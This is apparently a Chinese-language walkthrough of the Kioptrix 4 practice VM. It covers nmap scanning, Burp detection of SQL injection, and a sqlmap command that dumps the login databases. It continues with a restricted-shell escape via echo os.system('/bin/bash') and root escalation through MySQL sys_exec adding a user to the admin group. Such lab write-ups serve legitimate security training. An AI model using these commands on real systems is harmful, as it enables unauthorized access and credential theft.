# NMAP扫描平台IP
## 确保虚拟机在所知网段下
## 这玩意儿是DHCP自动获取IP的，所以我们可以控制它所在的网段。
## 使用 nmap -sP `192.168.75.*`扫描这个网段的所有IP
![image](\Kioptrix4-image\NMAP扫描.png)
## ifconfig 查看自身IP
![image](\Kioptrix4-image\ifconfig.png)
## 推断对方IP为192.168.75.128
## NMAP扫描端口
- nmap -T5 -O -A -sV -p 1-60000 192.168.75.128
![image](\Kioptrix4-image\NMAP端口扫描.png)
- 开启端口为22:SSH,80:HTTP,139,445
## 推测该服务器有网页存在，也可以SSH连接
## 测试使用浏览器直接访问IP
![image](\Kioptrix4-image\IP猜对.png)
## 访问成功

# BURP测试漏洞
## 抓包分析
![image](\Kioptrix4-image\BURP抓包1.png)
## 在`&submit`前加上`'`测试回包
![image](\Kioptrix4-image\回包出错.png)
## 报错，推测此处存在SQL注入

# SQLmap注入
## sqlmap -u "http://192.168.44.164/checklogin.php" --data "myusername=admin&mypassword=asdfa&Submit=Login" --level=5 
>- -u URL, --url=URL   目标 URL
>- --data=DATA         通过 POST 发送的数据字符串
>- --level=LEVEL       执行测试的级别(1-5, 默认 1)
>- --risk=RISK         执行测试的风险(1-3, 默认 1) 
## 注入点发现
![image](\Kioptrix4-image\SQL注入点.png)
## 爆数据库
### 正在使用的数据库
![image](\Kioptrix4-image\数据库1.png)
### 全部数据库
![image](\Kioptrix4-image\数据库2.png)
### 正常SQLMAP注入步骤操作ING
- member数据库
![image](\Kioptrix4-image\menmber数据库dump.png)
- mysql数据库
![image](\Kioptrix4-image\sql数据库dump.png)
### 使用member数据库登入尝试
- 成功
![image](\Kioptrix4-image\member数据库登入.png)

# SSH连接
## 连接成功
![image](\Kioptrix4-image\SSH登入.png)
## 命令缺失
### lshell是一个用Python编码的shell，它允许您将用户的环境限制为有限的命令集，选择通过SSH启用/禁用任何命令（例如SCP，SFTP，rsync等），记录用户命令，实现时序限制和更多。
![image](\Kioptrix4-image\命令缺失.png)
## 命令缺失解决
### 通过利用echo命令调用os.system以生成shell，可以逃离此shell：
### echo os.system(‘/bin/bash’)
![image](\Kioptrix4-image\命里缺失解决.png)

## 提权
### - 由于目标没有安装gcc编译器，且SSH文件传输限制。暂时不考虑编写脚本提权。
### - mysql具有root权限
>- 可以使用用户定义函数（UDF）从MySQL服务器根级别升级到系统根目录
>- 需要lib_mysqludf_sys.so库，其中包含一些可以与OS交互的有用函数。最重要的是sys_exec（执行命令并返回退出状态）和sys_eval（执行命令并返回标准输出）

    在Ubuntu 11.10之前，通过sudo具有root权限的管理员的Unix组是管理员。从Ubuntu 12.04 LTS开始，它现在是sudo，因为它与Debian和sudo本身兼容。但是，为了向后兼容，管理员组成员仍被识别为管理员
>因此，可以使john帐户成为admin组的一部分，这相当于sudo组

### mysql执行
    mysql
    select sys_exec('usermod -a -G admin john');
    john@Kioptrix4:~$ sudo su
    [sudo] password for john: 
    root@Kioptrix4:/home/john# whoami
    root
![image](\Kioptrix4-image\sql提权.png)

# 完成
## 在root目录下有个congrats.txt。